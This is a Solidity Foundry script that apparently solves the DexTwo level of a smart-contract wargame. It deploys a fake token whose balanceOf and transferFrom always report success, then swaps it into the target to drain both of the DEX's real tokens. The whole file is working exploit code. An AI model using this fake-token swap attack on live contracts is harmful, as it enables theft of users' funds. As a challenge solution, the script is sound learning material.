// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "src/levels/DexTwo/DexTwo.sol";
import "forge-std/Script.sol";

contract DexTwoAttackScript is Script {
    function setUp() public {}

    function run() public {
        DexTwo target = DexTwo(0x0000000000000000000000000000000000000000); // Insert instance target address

        vm.startBroadcast();

        // Deploy MaliciousTokenContract instance
        MaliciousTokenContract evilCoin = new MaliciousTokenContract();

        // Attack through low level call
        target.swap(address(evilCoin), target.token1(), 100);
        target.swap(address(evilCoin), target.token2(), 100);

        vm.stopBroadcast();
    }
}

contract MaliciousTokenContract {
    function balanceOf(address) public pure returns (uint256) {
        return 100;
    }

    function transferFrom(address, address, uint256) public pure returns (bool) {
        return true;
    }
}
